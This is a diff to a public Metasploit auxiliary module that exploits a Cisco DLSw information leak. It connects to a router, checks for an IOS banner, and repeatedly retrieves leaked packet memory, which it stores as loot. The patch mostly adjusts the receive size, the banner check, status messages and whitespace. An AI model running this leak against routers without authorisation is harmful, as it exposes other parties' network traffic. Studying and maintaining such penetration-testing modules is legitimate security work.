@@ -1,5 +1,5 @@
 ##
-# This module requires Metasploit: http//metasploit.com/download
+# This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
@@ -16,16 +16,16 @@ class Metasploit3 < Msf::Auxiliary
     super(
       'Name'           => 'Cisco DLSw information leak',
       'Description'    => %q{
-       This module implements the DLSw information leak retrieval. There is
+       This module implements the DLSw information leak retrieval. There is 
        a bug in Cisco's DLSw implementation affecting 12.x and 15.x trains
        that allows an unuthenticated remote attacker to retrieve the partial
-       contents of packets traversing a Cisco router with DLSw configured
-       and active.
+       contents of packets traversing a Cisco router with DLSw configured 
+       and active.  
       },
       'Author'         => [
         'Tate Hansen', # Vulnerability discovery
         'John McLeod', # Vulnerability discovery
-        'Kyle Rainey', # Built lab to recreate vulnerability and help test
+        'Kyle Rainey', # Built lab to recreate vulnerability and help test  
       ],
       'References'     =>
         [
@@ -45,19 +45,19 @@ class Metasploit3 < Msf::Auxiliary
 
   # Called when using check
   def check_host(ip)
-    print_status "Checking for DLSw exposure"
+    print_status "Checking #{ip}:#{rport} for DLSw exposure"
     connect
-    response = sock.recv(72)
+    response = sock.recv(1024)
     disconnect
 
-    if response.length > 0
-     print_status("Cisco router appears vulnerable - DLSw data is returned when establishing a connection to #{rport}")
+    if (response.length > 0) && (response =~ /IOS Software|cisco.com/)
+     print_status("The target Cisco router appears vulnerable, we detected parts of a Cisco IOS banner string emitted from #{ip}:#{rport}")
      report_vuln({
         :host => rhost,
         :port => rport,
         :name => self.name,
         :refs => self.references,
-        :info => "Module #{self.fullname} successfully leaked info"
+        :info => "Module #{self.fullname} collected #{response.length} bytes"
       })
       Exploit::CheckCode::Vulnerable
     else
@@ -69,7 +69,7 @@ class Metasploit3 < Msf::Auxiliary
   def run_host(ip)
     return unless check_host(ip) == Exploit::CheckCode::Vulnerable
 
-    print_status("Going to run until we retrieve #{datastore['LEAK_AMOUNT']} bytes from #{ip}")
+    print_status("Going to run until we retrieve #{datastore['LEAK_AMOUNT']} bytes from #{ip}:#{rport}")
 
     dlsw_data = ""
     until dlsw_data.length > datastore['LEAK_AMOUNT']
@@ -92,6 +92,8 @@ class Metasploit3 < Msf::Auxiliary
       'DLSw_leaked_data',
       'DLSw packet memory leak'
     )
-    print_status("DLSw data stored in #{path}")
+    print_status("DLSw leaked data from #{ip}:#{rport} stored in #{path}")
   end
 end
+
+   
